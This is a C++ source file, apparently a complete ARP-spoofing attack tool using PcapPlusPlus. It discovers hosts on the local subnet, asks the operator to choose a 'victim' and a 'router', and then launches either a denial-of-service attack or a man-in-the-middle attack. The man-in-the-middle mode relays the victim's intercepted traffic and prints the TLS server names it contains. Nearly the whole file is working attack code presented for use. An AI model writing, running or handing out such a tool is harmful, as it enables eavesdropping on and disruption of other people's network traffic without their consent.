#include <iostream>
#include <ranges>
#include <thread>
#include <stop_token>
#include <chrono>
#include <map>
#include <mutex>
#include <memory>

#include <arpa/inet.h>
#include <netdb.h>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#include <boost/asio.hpp>
#include <boost/asio/experimental/channel.hpp>
#include <boost/asio/awaitable.hpp>
#include <boost/asio/co_spawn.hpp>
#include <boost/asio/detached.hpp>
#include <boost/asio/use_awaitable.hpp>

#include <PcapLiveDeviceList.h>
#include <PcapLiveDevice.h>
#include <IpAddress.h>
#include <Packet.h>
#include "EthLayer.h"
#include <ArpLayer.h>
#include <IPv4Layer.h>
#include <SSLLayer.h>
#include <Logger.h>

constexpr std::chrono::seconds ARP_DISCOVERY_INTERVAL = std::chrono::seconds(1);
constexpr std::chrono::seconds ARP_SPOOF_INTERVAL = std::chrono::seconds(1);

struct Device
{
    size_t index;
    std::string name;
    pcpp::MacAddress mac;
    pcpp::IPv4Address ip;
};

std::ostream &operator<<(std::ostream &os, const Device &dev)
{
    os << std::left << std::setw(20) << dev.name
       << std::setw(15) << dev.ip
       << " " << std::setw(18) << dev.mac;
    return os;
}

struct DiscoveredDevices
{
    int count = 0;
    std::unordered_map<int, Device> discovered_devices;
    std::mutex mtx;
};

DiscoveredDevices discovered;

pcpp::PcapLiveDevice *selectNetworkInterface()
{
    auto devices = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();
    auto net_devices = devices | std::views::filter([](auto dev)
                                                    { return !dev->getIPAddresses().empty(); });

    int index = 1;
    for (auto dev : net_devices)
    {
        if (dev->getIPAddresses().empty())
        {
            continue;
        }
        std::cout << index << ": " << dev->getName() << std::endl;
        std::cout << "\tether: " << dev->getMacAddress() << std::endl;
        for (auto &ip : dev->getIPAddresses())
        {
            auto type = " inet: ";
            if (ip.getType() == pcpp::IPAddress::AddressType::IPv6AddressType)
            {
                type = "inet6: ";
            }

            std::cout << "\t" << type << ip << std::endl;
        }
        index++;
    }

    int selected = 0;
    pcpp::PcapLiveDevice *device = nullptr;
    while (true)
    {

        std::cout << "choose a network interface:" << std::endl;
        std::cin >> selected;

        if (selected > (index - 1) || selected <= 0)
        {
            std::cout << "invalid device selected. Try again:" << std::endl;
        }
        else
        {

            device = *std::next(net_devices.begin(), selected - 1); // safe to deref due to earlier boundary check
            std::cout << "selected: " << device->getName() << std::endl;
            break;
        }
    }
    return device;
}

std::string resolveHostname(const std::string &ip)
{
    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;

    if (inet_pton(AF_INET, ip.c_str(), &sa.sin_addr) <= 0)
        return "unkown";

    char host[NI_MAXHOST];
    if (getnameinfo((struct sockaddr *)&sa, sizeof(sa),
                    host, sizeof(host),
                    nullptr, 0, 0) != 0)
        return "unkown";

    return std::string(host);
}

void onDiscoveryPacketArrives(
    pcpp::RawPacket *rawPacket,
    pcpp::PcapLiveDevice *dev,
    void *cookie)
{
    (void)dev;
    auto *device_list = static_cast<DiscoveredDevices *>(cookie);

    pcpp::Packet packet(rawPacket);

    if (packet.isPacketOfType(pcpp::ARP))
    {
        auto *arp = packet.getLayerOfType<pcpp::ArpLayer>(false);
        auto mac = arp->getSenderMacAddress();
        auto ip = arp->getSenderIpAddr();
        {
            std::lock_guard lock(device_list->mtx);
            auto ip_int = ip.toInt();
            if (!device_list->discovered_devices.contains(ip_int))
            {
                auto device = Device{
                    .index = device_list->discovered_devices.size(),
                    .name = resolveHostname(ip.toString()),
                    .mac = mac,
                    .ip = ip,
                };
                std::cout << device.index << ": " << device << std::endl;
                device_list->discovered_devices[ip.toInt()] = device;
            }
        }
    }
}

bool createAndSendArpPacket(pcpp::PcapLiveDevice *dev, pcpp::IPv4Address src_ip, pcpp::IPv4Address dst_ip, pcpp::MacAddress dst_mac, pcpp::ArpOpcode op)
{
    // ARP layer
    pcpp::ArpLayer arpLayer(
        op,
        dev->getMacAddress(),
        src_ip,
        dst_mac, // target MAC
        dst_ip   // target IP
    );

    // Ethernet layer
    pcpp::EthLayer ethLayer(
        dev->getMacAddress(), // src MAC
        dst_mac,              // dst MAC
        PCPP_ETHERTYPE_ARP);

    // Build packet
    pcpp::Packet arpRequest(50); // IPv4 ARP request fits in 42 bytes  = 14 (ethernet header) + 28 (ARP header)
    arpRequest.addLayer(&ethLayer);
    arpRequest.addLayer(&arpLayer);
    arpRequest.computeCalculateFields();
    return dev->sendPacket(&arpRequest, true);
};

uint32_t getSubnetMask(const std::string &iface_name)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1)
        return 0;

    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFNETMASK, &ifr) == -1)
    {
        close(fd);
        return 0;
    }
    close(fd);

    auto *sin = reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
    return ntohl(sin->sin_addr.s_addr); // .s_addr is in network byte order
}

void sendArpRequests(pcpp::PcapLiveDevice *dev, std::stop_token st)
{
    auto my_ip = dev->getIPv4Address();
    while (!st.stop_requested())
    {
        uint32_t my_ip_host = ntohl(my_ip.toInt());
        uint32_t network_base = my_ip_host & getSubnetMask(dev->getName());
        for (int i = 1; i < 255; i++)
        {
            pcpp::IPv4Address dst_ip(htonl(network_base | i));
            createAndSendArpPacket(dev, my_ip, dst_ip, pcpp::MacAddress::Broadcast, pcpp::ArpOpcode::ARP_REQUEST);
            std::this_thread::sleep_for(std::chrono::milliseconds(10)); // avoid sending bursts
        }

        std::this_thread::sleep_for(ARP_DISCOVERY_INTERVAL);
    }
}

/// @brief  Scans the network by sending arp requests to all devices in a network at 1 second interval and learning about
/// the ones that reply
/// @param dev : Network interface to use for device discovery
std::pair<Device, Device> scanNetwork(pcpp::PcapLiveDevice *dev)
{
    if (!dev->open())
    {
        std::cout << "could not open " << dev->getName() << " for packet capture" << std::endl;
        exit(-1);
    }

    std::cout << "Scanning network. Press ENTER to stop" << std::endl;
    // start packet capture
    dev->startCapture(onDiscoveryPacketArrives, &discovered);
    // send arp requests at 1 second interval
    std::jthread arp_requests([dev](std::stop_token st)
                              { sendArpRequests(dev, st); });

    std::string enter;
    std::getline(std::cin, enter);
    std::getline(std::cin, enter);
    dev->stopCapture();
    arp_requests.request_stop();

    size_t victim = 0, router = 0;
    std::cout << "Select victim:" << std::endl;
    std::cin >> victim;
    std::cout << "Select router:" << std::endl;
    std::cin >> router;

    if (victim >= discovered.discovered_devices.size() || router >= discovered.discovered_devices.size())
    {
        std::cout << "Invalid device selected" << std::endl;
        exit(-1);
    }

    std::pair<Device, Device> res;
    for (auto &[k, v] : discovered.discovered_devices)
    {
        (void)k;
        if (v.index == victim)
        {
            res.first = v;
        }
        if (v.index == router)
        {
            res.second = v;
        }
    }
    return res;
}

std::mutex send_mtx;

/// Lie to `target` that we are `victim`
void arpSpoof(pcpp::PcapLiveDevice *dev, const Device &victim, const Device &target)
{
    std::lock_guard g(send_mtx);
    createAndSendArpPacket(dev, victim.ip, target.ip, target.mac, pcpp::ArpOpcode::ARP_REPLY);
}

void arpSpoofLoop(pcpp::PcapLiveDevice *dev, Device victim, Device target)
{
    while (true)
    {
        arpSpoof(dev, victim, target);
        std::this_thread::sleep_for(ARP_DISCOVERY_INTERVAL);
    }
}

void statDos(pcpp::PcapLiveDevice *dev, Device victim, Device router)
{
    std::jthread spoof_victim([=]()
                              { arpSpoofLoop(dev, router, victim); });
    std::jthread spoof_router([=]()
                              { arpSpoofLoop(dev, victim, router); });
}

static boost::asio::io_context async_ctx;
static auto work_guard = boost::asio::make_work_guard(async_ctx);
using PacketChannel = boost::asio::experimental::channel<void(boost::system::error_code, std::unique_ptr<pcpp::Packet>)>;
PacketChannel &getProcessingChannel()
{
    // The channel is initialized only on the first call
    static PacketChannel channel(async_ctx.get_executor(), 1024);
    return channel;
}

void onInterceptedPacketArrives(
    pcpp::RawPacket *rawPacket,
    pcpp::PcapLiveDevice *dev,
    void *cookie)
{
    std::pair<Device, Device> *devices = static_cast<std::pair<Device, Device> *>(cookie);
    auto packet = std::make_unique<pcpp::Packet>(rawPacket->clone(), true); // deep copy of the raw packet + pass true to de-allocate the rawPacket when Packet is dropped
    auto ethernet = packet->getLayerOfType<pcpp::EthLayer>();
    auto my_mac = dev->getMacAddress();
    auto src_mac = ethernet->getSourceMac();
    auto dst_mac = ethernet->getDestMac();
    if (src_mac == devices->first.mac && dst_mac == my_mac)
    {
        // victim sent a packet, forward to router
        ethernet->setDestMac(devices->second.mac);
    }
    else if (src_mac == devices->second.mac && dst_mac == my_mac)
    {
        // router sent a packet, forward to victim
        ethernet->setDestMac(devices->first.mac);
    }
    else
    {
        return; // drop
    }
    ethernet->setSourceMac(my_mac);

    dev->sendPacket(packet.get(), true);
    // std::cout << "got packet: " << packet->getRawPacket()->getRawDataLen() << std::endl;

    // move the packet to packet inspection coroutine
    if (!getProcessingChannel().try_send(boost::system::error_code{}, std::move(packet)))
    {
        std::cerr << "Queue full, dropping packet" << std::endl;
    }
}

void extractSNI(std::unique_ptr<pcpp::Packet> &packet)
{
    // Try to find the SSL/TLS Handshake layer
    auto *handshakeLayer = packet->getLayerOfType<pcpp::SSLHandshakeLayer>();

    if (handshakeLayer != nullptr)
    {
        // Get the Client Hello message (SNI is sent by the client)
        auto *clientHello = handshakeLayer->getHandshakeMessageOfType<pcpp::SSLClientHelloMessage>();

        if (clientHello != nullptr)
        {
            // 3. SNI is a TLS extension
            auto *sniExt = clientHello->getExtensionOfType<pcpp::SSLServerNameIndicationExtension>();

            if (sniExt != nullptr)
            {
                std::cout << "Found SNI: " << sniExt->getHostName() << std::endl;
            }
        }
    }
}

boost::asio::awaitable<void> packetInspector()
{

    while (true)
    {
        // Suspend here until a packet arrives
        std::unique_ptr<pcpp::Packet> packet = co_await getProcessingChannel().async_receive(boost::asio::use_awaitable);
        extractSNI(packet);
    }
}

void startManInTheMiddle(pcpp::PcapLiveDevice *dev, Device victim, Device router)
{
    std::jthread spoof_victim([=]()
                              { arpSpoofLoop(dev, router, victim); });
    std::jthread spoof_router([=]()
                              { arpSpoofLoop(dev, victim, router); });

    std::jthread packet_inspector_runtime([]()
                                          { async_ctx.run(); });

    // Spawn the coroutine for packet processing
    boost::asio::co_spawn(async_ctx, packetInspector(), boost::asio::detached);

    // `cookie` will remain alive until the application is closed as this function never exits due to automatic join of the threads above
    auto cookie = std::make_unique<std::pair<Device, Device>>(victim, router);
    dev->startCapture(onInterceptedPacketArrives, cookie.get());
}

int main()
{

    pcpp::Logger::getInstance().suppressLogs();

    auto interface = selectNetworkInterface();
    auto [victim, router] = scanNetwork(interface);
    std::cout << "selected:" << std::endl
              << "victim: " << victim << std::endl
              << "router: " << router << std::endl;

    std::cout << "select attack: dos, mitm" << std::endl;
    std::string attack;
    std::cin >> attack;

    if (attack == "dos")
    {
        std::cout << "Starting DoS attack... use Ctrl+C to cancel" << std::endl;
        statDos(interface, victim, router);
    }
    else if (attack == "mitm")
    {
        std::cout << "Starting Man-In-The-Middle attack... use Ctrl+C to cancel" << std::endl;
        startManInTheMiddle(interface, victim, router);
    }

    return 0;
}
